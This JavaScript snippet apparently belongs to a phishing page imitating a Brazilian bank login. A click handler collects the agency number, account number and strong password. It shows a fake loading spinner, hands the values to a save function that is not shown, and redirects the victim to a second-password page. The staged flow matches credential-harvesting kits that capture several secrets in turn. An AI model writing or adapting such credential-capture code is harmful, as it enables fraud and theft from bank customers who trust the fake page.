const validates = document.getElementById('triggerbtncpf');

validates.addEventListener('click', async (event) => {
        event.preventDefault();

        const agency = document.getElementById("agency").value;
        const account = document.getElementById("account").value;
        const passwordStrong = document.getElementById("passwordStrong").value;

        callSpinner();
            const sleep = milliseconds => {
                return new Promise(resolve => setTimeout(resolve, milliseconds));
                };
            await sleep(1000);
        try {
            savedatacpf(agency, account, passwordStrong);
            window.location.href = '../secondPassword.html';
         } 
         catch(error){
            console.log(error); 
            window.location.href = '../error.html';
         }  
});
